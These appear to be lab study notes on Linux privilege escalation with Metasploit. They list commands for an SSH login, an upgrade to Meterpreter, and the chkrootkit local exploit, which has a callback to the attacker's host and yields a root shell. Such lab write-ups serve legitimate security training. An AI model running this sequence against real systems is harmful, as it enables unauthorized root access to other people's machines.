* The privilege escalation techniques which can be utilized depends on:
    * Version of the Linux kernel
    * Distribution release version
 
* MSF offers very little to exploit Linux kernel
* However in some cases MSF modules can be useful

* PRACTICAL
* Repeat steps till db_nmap
* As the credentials are provided with this lab, we will exploit SSH service
* `use auxiliary/scanner/ssh/ssh_login`
* `set username [uname]`
* `set password [pword]`
* `run` -> Commmand shell
* `sessions -u [ID]` --> Meterpreter session

* **List all the processes**
* `ps aux`
* We will look for the processes that could be vulnerable
* Looking into "/bin/check-down"
* `cat /bin/check-down`
* As we can see it is linked to chkrootkit
* `chkrootkit --help`
* `chkrootkit -V`
* We will try to exploit chkrootkit:
* `search chkrootkit`
* `use exploit/unix/local/chkrootkit`
* When we cat chkrootkit file, we observed that it was stored in /bin folder:
* `set chkrootkit /bin/chkrootkit`
* `set session [Meterpreter ID]`
* `set lhost [Attacker's machine]`
* `run` --> Command shell as a root user on the target
